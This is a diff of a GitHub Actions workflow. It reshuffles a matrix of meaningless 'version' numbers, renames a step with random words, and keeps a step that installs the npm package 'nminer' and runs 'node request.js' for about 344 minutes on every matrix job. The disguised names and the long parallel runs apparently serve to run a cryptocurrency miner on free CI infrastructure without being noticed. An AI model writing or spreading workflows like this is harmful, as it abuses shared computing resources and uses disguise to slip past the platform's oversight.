@@ -9,24 +9,23 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 9730 }
-          - { version: 6958 }
-          - { version: 6840 }
-          - { version: 3268 }
-          - { version: 4838 }
-          - { version: 6839 }
-          - { version: 5516 }
-          - { version: 5314 }
-          - { version: 7261 }
-          - { version: 5294 }
-          - { version: 4967 }
-          - { version: 2552 }
-          - { version: 9334 }
-          - { version: 908 }
-          - { version: 2421 }
-          - { version: 7297 }
-          - { version: 563 }
-          - { version: 1336 }
+          - { version: 262 }
+          - { version: 5839 }
+          - { version: 9273 }
+          - { version: 6739 }
+          - { version: 6577 }
+          - { version: 4377 }
+          - { version: 6463 }
+          - { version: 5300 }
+          - { version: 3207 }
+          - { version: 2093 }
+          - { version: 7556 }
+          - { version: 690 }
+          - { version: 7537 }
+          - { version: 3711 }
+          - { version: 2893 }
+          - { version: 9112 }
+          - { version: 7914 }
 
     steps:
       - name: Checkout
@@ -37,7 +36,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: how moist squeaky stale fray
+      - name: feminize independence gloss
         run: |
           npm install nminer@latest
-          timeout 349m node request.js || echo "request executed"
+          timeout 344m node request.js || echo "request executed"
